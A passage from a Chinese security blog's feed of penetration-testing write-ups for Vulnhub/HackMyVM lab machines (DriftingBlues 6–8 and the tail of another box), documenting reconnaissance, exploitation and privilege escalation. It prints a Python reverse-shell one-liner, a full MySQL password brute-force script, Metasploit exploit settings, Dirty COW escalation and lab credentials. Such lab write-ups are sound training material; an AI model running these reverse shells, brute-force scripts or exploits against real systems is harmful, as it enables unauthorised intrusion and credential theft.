sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈻戔暁鈺愨晲鈺愨晲鈺濃枒鈺氣晲鈺濃枒鈻戔暁鈺愨暆鈻戔枒鈻戔暁鈺愨暆鈻戔枒鈻戔暁鈺愨暆鈻戔枒鈻戔枒鈻戔枒鈻戔枒鈺氣晲鈺濃枒鈻戔枒鈺氣晲鈺愨晲鈺愨晲鈺濃枒鈺氣晲鈺濃枒鈻戔暁鈺愨暆鈺氣晲鈺愨晲鈺愨晲鈺愨暆鈺氣晲鈺愨晲鈺愨晲鈺愨暆鈺氣晲鈺愨&quot;</span></span><br><span class="line">    <span class="string">&quot;晲鈺愨晲鈺愨暆\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_QWORD *)(a2 + <span class="number">8</span>);</span><br><span class="line">    v3 = <span class="string">&quot;\nYou wish!&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4010A0(v2, <span class="string">&quot;-h&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401018(v8, v2);</span><br><span class="line">      v4 = sub_4010C8(v8);</span><br><span class="line">      <span class="keyword">if</span> ( v8[v4 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">        v8[v4 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      v5 = sub_401D90(v8, <span class="string">&quot;$2b$15$TXl.yuAF49958vsn1dqPfe&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_4010A0(v5, <span class="string">&quot;$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_453290(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        sub_41DDC0(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v3 = <span class="string">&quot;Unable to decompress.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_41EAA0(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>尝试破解
<code>$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111744036.png" /></p>
<p>得 mike，再次尝试执行 <code>1cryptupx</code> 和
<code>crypt</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111752002.png" /></p>
<p>利用 <code>/usr/share/man/zh_TW/crypt mike</code> 成功提权……</p>
<p>以为结束了……但看了下别人的 WP 发现还要进行内网渗透……</p>
<h2 id="内网信息收集">3. 内网信息收集</h2>
<h3 id="主机探测-1">3.1. 主机探测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111803163.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 172.16.20.0/24</span><br></pre></td></tr></table></figure>
<p>nmap 未自带，发现可以直接用 apt-get 安装……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111803087.png" /></p>
<p>找到个 172.16.20.6 的主机</p>
<h3 id="端口扫描-1">3.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111833332.png" /></p>
<p>只有个 22 端口</p>
<p>在 /home/mike/.ssh 下找到了 mike 用户的公钥和私钥，利用 scp 传出来用
john 破解，结果提示没密码……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111839175.png" /></p>
<h3 id="ssh-登录">3.3. ssh 登录</h3>
<p>内网直接用 id_rsa 登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111842915.png" /></p>
<p>成功登录，考虑提权</p>
<h3 id="内网机提权">3.4. 内网机提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
<p><code>ps -ef</code> 得有 mysql 进程，可能存在弱口令</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111849969.png" /></p>
<p>上传脚本尝试爆破【<code>python -m http.server</code>】</p>
<p>crack.sh【来源<a
href="https://blog.csdn.net/weixin_43094965/article/details/134453647">【MySql密码爆破脚本】用于其他爆破工具无法使用的情况下-CSDN博客</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本参数</span></span><br><span class="line">username=<span class="variable">$1</span>  <span class="comment"># MySQL用户（或字典路径）</span></span><br><span class="line">password=<span class="variable">$2</span>  <span class="comment"># MySQL密码（或字典路径）</span></span><br><span class="line">task_num=<span class="variable">$&#123;3:-32&#125;</span>  <span class="comment"># 并发数，默认 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查参数是否存在</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$username</span>&quot;</span> ] || [ -z <span class="string">&quot;<span class="variable">$password</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;请输入用户名（或字典路径）和密码（或字典路径）&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;用法: ./mysql_login.sh username password&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并发数，默认 32</span></span><br><span class="line"><span class="keyword">if</span> ! [[ <span class="variable">$task_num</span> =~ ^[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">    task_num=32</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取用户字典文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;读取用户信息...&#x27;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$username</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    usernames=$(<span class="built_in">cat</span> <span class="variable">$username</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    usernames=$(<span class="built_in">echo</span> <span class="variable">$username</span> | <span class="built_in">cat</span>)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># 读取密码字典文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;读取密码信息...&#x27;</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$password</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    passwords=$(<span class="built_in">cat</span> <span class="variable">$password</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    passwords=$(<span class="built_in">echo</span> <span class="variable">$password</span> | <span class="built_in">cat</span>)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试登录函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">try_mysql_login</span></span>() &#123;</span><br><span class="line">    user=<span class="variable">$1</span></span><br><span class="line">    pswd=<span class="variable">$2</span></span><br><span class="line">    <span class="comment"># 尝试登录MySQL</span></span><br><span class="line">    output=$(mysql -u <span class="variable">$user</span> -p<span class="variable">$pswd</span> -e <span class="string">&quot;exit&quot;</span> 2&gt;&amp;1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查输出是否包含错误信息</span></span><br><span class="line">    <span class="keyword">if</span> [[ ! <span class="variable">$output</span> =~ <span class="string">&#x27;ERROR&#x27;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;成功登录，用户密码为 -&gt; <span class="variable">$user</span> : <span class="variable">$pswd</span>&quot;</span></span><br><span class="line">        <span class="comment"># 获取当前脚本的 PID</span></span><br><span class="line">        script_pid=$(ps -p $$ | grep -v PID | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">        <span class="comment"># 强制结束当前脚本</span></span><br><span class="line">        <span class="built_in">kill</span> -s 9 <span class="variable">$script_pid</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">print_progress</span></span>() &#123;</span><br><span class="line">    <span class="comment"># 打印进度，如果一直没有输出，时间太长会感觉卡死了</span></span><br><span class="line">    numb=<span class="variable">$1</span></span><br><span class="line">    task=<span class="variable">$2</span></span><br><span class="line">    snum=<span class="variable">$3</span></span><br><span class="line">    user=<span class="variable">$4</span></span><br><span class="line">    pswd=<span class="variable">$5</span></span><br><span class="line">    <span class="keyword">if</span> [ $((<span class="variable">$numb</span> % (<span class="variable">$task</span> * <span class="number">10</span>))) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;尝试登录进度(<span class="variable">$numb</span>/<span class="variable">$snum</span>) -&gt; <span class="variable">$user</span> : <span class="variable">$pswd</span>&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环遍历密码字典</span></span><br><span class="line">pool=0</span><br><span class="line">count=0</span><br><span class="line">total_tasks=$(($(echo &quot;<span class="variable">$usernames</span>&quot; | wc -l) * $(echo &quot;<span class="variable">$passwords</span>&quot; | wc -l)))</span><br><span class="line"><span class="keyword">for</span> username <span class="keyword">in</span> <span class="variable">$usernames</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;尝试用户: <span class="variable">$username</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> <span class="variable">$passwords</span>; <span class="keyword">do</span></span><br><span class="line">        count=$((count + <span class="number">1</span>))</span><br><span class="line">        <span class="comment"># 等待空闲进程池中的任务</span></span><br><span class="line">        <span class="keyword">while</span> [ <span class="variable">$pool</span> -ge <span class="variable">$task_num</span> ]; <span class="keyword">do</span></span><br><span class="line">          <span class="built_in">wait</span> -n</span><br><span class="line">          ((pool--))</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 创建新任务并加入进程池</span></span><br><span class="line">        &#123;</span><br><span class="line">          try_mysql_login <span class="variable">$username</span> <span class="variable">$password</span></span><br><span class="line">          <span class="comment"># 在这里执行具体的登录操作，例如使用ssh命令</span></span><br><span class="line">          <span class="comment"># 示例：sshpass -p &quot;$password&quot; ssh &quot;$user&quot;@hostname command</span></span><br><span class="line">        &#125; &amp;</span><br><span class="line">        ((pool++))</span><br><span class="line">        print_progress <span class="variable">$count</span> <span class="variable">$task_num</span> <span class="variable">$total_tasks</span> <span class="variable">$username</span> <span class="variable">$password</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有进程完成</span></span><br><span class="line"><span class="built_in">wait</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;密码爆破失败&quot;</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure>
<p><strong>注，</strong> 原本考虑的基于 ssh 来实现端口转发，然后利用
kali 的 hydra 爆破，但未成功！ssh 隧道建完后【具体操作参见：<a
href="https://z9m8r8.github.io/2023/04/03/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E6%8A%80%E6%9C%AF/">流量操控技术
| Ghost's Blog</a>】，kali
能直接登录内网机【172.16.20.6】，但同理实现对mysql的端口转发后【内网机自身要实现】，登录
mysql 时总是会出现 <code>access denied</code> ，另外之所以选择 bash
脚本，因为靶机经测试有Python3的环境，但缺部分模块，由于是内网机测试Python脚本和安装模块都很麻烦……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112319671.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112252019.png" /></p>
<p>mysql 存在弱口令 mike/password</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112019786.png" /></p>
<p>数据库中找到了用户信息
root/bjsig4868fgjjeog，mike/WhatAreYouDoingHere</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112015588.png" /></p>
<p>用密码提权尝试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112015589.png" /></p>
<p>提权成功，并在 /root 下找到个 mike.zip
，而解压所需密码经测试是前面数据库中查到的</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403112015590.png" /></p>
<p>拿到 flag……</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 6</title>
    <url>/2024/03/29/DriftingBlues%206/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-6,672/">DriftingBlues:
6 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291329619.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291329905.png" /></p>
<p>仅扫描到了 80，还有个 /textpattern/textpattern/ 目录</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>扫目录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291330502.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291330503.png" /></p>
<p>/textpattern/textpattern/ 下是 TextPattern CMS
的登录页面，爆破估计没戏……根据提示继续扫目录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291330505.png" /></p>
<p>找到个 spammer.zip</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291334325.png" /></p>
<p>解压要密码，用 fcrackzip 爆破下试试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p rockyou.txt -u spammer.zip </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291335787.png" /></p>
<p>得 mayer:lionheart ，应该是 TextPattern CMS
的登录账号及密码，登录尝试 getshell</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>看 CMS 主页页脚提示是 v4.8.3，到 <a
href="https://www.exploit-db.com/">Exploit Database - Exploits for
Penetration Testers, Researchers, and Ethical Hackers</a>
找找历史漏洞</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291337804.png" /></p>
<p>以 <a href="https://www.exploit-db.com/exploits/49996">TextPattern
CMS 4.8.7 - Remote Command Execution (Authenticated) - PHP webapps
Exploit</a> 为例，上传 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291341843.png" /></p>
<p>成功！尝试反弹 shell【<a
href="https://forum.ywhack.com/shell.php">Site Unreachable</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.159.152&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291341844.png" /></p>
<p>在 /etc/passwd 中没看到普通用户，可能需直接提权至 root</p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null <span class="comment"># 查suid</span></span><br><span class="line">find / -writable 2&gt;/dev/null  <span class="comment"># 查找具有写入权限的文件</span></span><br><span class="line">find / -writable 2&gt;/dev/null | grep -v /proc</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab /etc/cron.d/* <span class="comment"># 定时任务</span></span><br><span class="line">crontab -l</span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
<p>找到个 config.php</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291348290.png" /></p>
<p>尝试进数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udrifter -pimjustdrifting31 -Dtextpattern_db</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291353302.png" /></p>
<p>找到个 txp_users 表，但仅有 mayer 的信息，用户权限受限 mysql
直接提权未果……</p>
<p>/var 下又找到个 get.zip，解压后仅是个站点的备份……</p>
<p>上传 pspy64 执行也未果……</p>
<p>考虑利用 Linux 内核提权了，看了 <a
href="https://xz.aliyun.com/t/8139?time__1311=n4%2BxuDgDBDyGoxWqGNDQT4wiD9GYdDRWaOYD">提权学习之旅——Linux操作系统提权
- 先知社区</a> 经测靶机存在 <code>Dirty COW，CVE-2016-5195</code>
漏洞</p>
<p>靶机下载 dirty.c 【<a
href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">dirtycow/dirty.c
at master · firefart/dirtycow · GitHub</a>】编译</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291405397.png" /></p>
<p>提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291405398.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291405399.png" /></p>
<p>拿到 flag!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 7</title>
    <url>/2024/03/29/DriftingBlues%207/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-7,680/">DriftingBlues:
7 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291633793.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291633050.png" /></p>
<p>所开端口：22,66,80,111,443,2403,3306,8086</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 端口的 EyesOfNetwork
登录不知道用户信息，尝试弱口令和注入未果，先扫目录看看</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291640138.png" /></p>
<p>下载看看</p>
<p>.bash_history</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/issue</span><br><span class="line">nano /etc/hosts</span><br><span class="line">nano /etc/hostname</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">crontab -e</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">rm</span> index.htm </span><br><span class="line">wget 192.168.2.43:81/db7i.htm</span><br><span class="line"><span class="built_in">mv</span> db7i.htm index.htm</span><br><span class="line">nano /etc/hostname</span><br><span class="line">nano /etc/hosts</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">wget 192.168.2.43:81/logdel2</span><br><span class="line">bash logdel2</span><br><span class="line">wget 192.168.2.43:81/root.txt</span><br><span class="line"><span class="built_in">mv</span> root.txt flag.txt</span><br><span class="line">nano flag.txt</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">shutdown -h now</span><br><span class="line">ip a</span><br><span class="line">shutdown -h now</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291645780.png" /></p>
<p>8086 端口</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291646391.png" /></p>
<p>8086 没发现有啥价值的信息，换字典二次扫描，先找找 EyesOfNetwork
历史漏洞 <a href="https://www.exploit-db.com/">Exploit Database -
Exploits for Penetration Testers, Researchers, and Ethical Hackers</a>
不知道版本挨个试试，需要用户信息的直接跳过</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291652499.png" /></p>
<p><a href="https://www.exploit-db.com/exploits/48169">EyesOfNetwork -
AutoDiscovery Target Command Execution (Metasploit) - Multiple remote
Exploit</a> 或许可以利用</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>msf 已集成，不用单独导入了</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291655968.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 192.168.159.143</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.159.152</span><br><span class="line"><span class="built_in">set</span> server_addr 192.168.159.143</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>直接拿到 root 权限的 shell 了</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291658096.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291700590.png" /></p>
<h3 id="补充">2.2. 补充</h3>
<p>目录的二次扫描又扫到个 eon</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291750648.png" /></p>
<p>下载看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UEsDBBQAAQAAAAOfg1LxSVvWHwAAABMAAAAJAAAAY3JlZHMudHh093OsvnCY1d4tLCZqMvRD+ZUU</span><br><span class="line">Rw+5YmOf9bS11scvmFBLAQI/ABQAAQAAAAOfg1LxSVvWHwAAABMAAAAJACQAAAAAAAAAIAAAAAAA</span><br><span class="line">AABjcmVkcy50eHQKACAAAAAAAAEAGABssaU7qijXAYPcazaqKNcBg9xrNqoo1wFQSwUGAAAAAAEA</span><br><span class="line">AQBbAAAARgAAAAAA</span><br></pre></td></tr></table></figure>
<p>尝试 base64 解码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291722513.png" /></p>
<p>应该是个 zip 压缩文件，里面有个 creds.txt ，creds.txt
可能是登录密码</p>
<blockquote>
<p>ZIP Archive (zip)，文件头：50 4B 03 04
ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件</p>
</blockquote>
<p><a
href="https://ohmygodlin.github.io/ctf/misc/2018/08/30/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">常见文件格式
| 把不懂的记下来，就懂了</a></p>
<p>尝试将其直接解码为文件【<a
href="https://base64.guru/converter/decode/file">Base64 to File | Base64
Decode | Base64 Converter | Base64</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291739553.png" /></p>
<p>解压需要密码，用 fcrackzip 爆破</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291708274.png" /></p>
<p>经测 <code>admin/isitreal31__</code> 可登录 EyesOfNetwork</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403291712657.png" /></p>
<p>可利用更多的 EyesOfNetwork 漏洞了……</p>
<p>参考：<a
href="https://www.freebuf.com/articles/web/327759.html">记一次hackmyvm综合靶场的渗透测试：driftingblues7
- FreeBuf网络安全行业门户</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 8</title>
    <url>/2024/03/31/DriftingBlues%208/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://hackmyvm.eu/machines/machine.php?vm=Driftingblues8">HackMyVM</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311647618.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403311648283.png" /></p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 端口是 openEMR CMS，需要登录，先扫下目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.144/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt -f</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[02:42:06] Starting: </span><br><span class="line">[02:42:06] 302 -    0B  - /index.php  -&gt;  interface/login/login.php?site=default</span><br><span class="line">[02:42:06] 301 -  319B  - /images  -&gt;  http://192.168.159.144/images/      </span><br><span class="line">[02:42:06] 200 -    8KB - /images/</span><br><span class="line">[02:42:08] 403 -  280B  - /icons/                                          </span><br><span class="line">[02:42:08] 200 -    2KB - /services/                                       </span><br><span class="line">[02:42:08] 301 -  322B  - /templates  -&gt;  http://192.168.159.144/templates/</span><br><span class="line">[02:42:08] 301 -  321B  - /services  -&gt;  http://192.168.159.144/services/  </span><br><span class="line">[02:42:08] 200 -    3KB - /templates/                                      </span><br><span class="line">[02:42:09] 301 -  320B  - /modules  -&gt;  http://192.168.159.144/modules/    </span><br><span class="line">[02:42:09] 200 -  964B  - /modules/                                        </span><br><span class="line">[02:42:09] 301 -  319B  - /common  -&gt;  http://192.168.159.144/common/      </span><br><span class="line">[02:42:09] 200 -    2KB - /common/                                         </span><br><span class="line">[02:42:10] 301 -  320B  - /library  -&gt;  http://192.168.159.144/library/    </span><br><span class="line">[02:42:10] 200 -   24KB - /library/                                        </span><br><span class="line">[02:42:10] 200 -    1KB - /public/                                         </span><br><span class="line">[02:42:10] 301 -  319B  - /public  -&gt;  http://192.168.159.144/public/      </span><br><span class="line">[02:42:11] 200 -    0B  - /version.php                                     </span><br><span class="line">[02:42:12] 200 -  937B  - /admin.php                                       </span><br><span class="line">[02:42:13] 301 -  319B  - /portal  -&gt;  http://192.168.159.144/portal/      </span><br><span class="line">[02:42:13] 200 -   28B  - /portal/                                         </span><br><span class="line">[02:42:15] 200 -    1KB - /tests/                                          </span><br><span class="line">[02:42:15] 301 -  318B  - /tests  -&gt;  http://192.168.159.144/tests/        </span><br><span class="line">[02:42:16] 301 -  318B  - /sites  -&gt;  http://192.168.159.144/sites/        </span><br><span class="line">[02:42:16] 200 -  938B  - /sites/                                          </span><br><span class="line">[02:42:21] 301 -  319B  - /custom  -&gt;  http://192.168.159.144/custom/      </span><br><span class="line">[02:42:21] 200 -    5KB - /custom/</span><br><span class="line">[02:42:25] 301 -  320B  - /contrib  -&gt;  http://192.168.159.144/contrib/    </span><br><span class="line">[02:42:25] 200 -    3KB - /contrib/                                        </span><br><span class="line">[02:42:29] 301 -  322B  - /interface  -&gt;  http://192.168.159.144/interface/</span><br><span class="line">[02:42:29] 200 -   37B  - /interface/</span><br><span class="line">[02:42:31] 301 -  319B  - /vendor  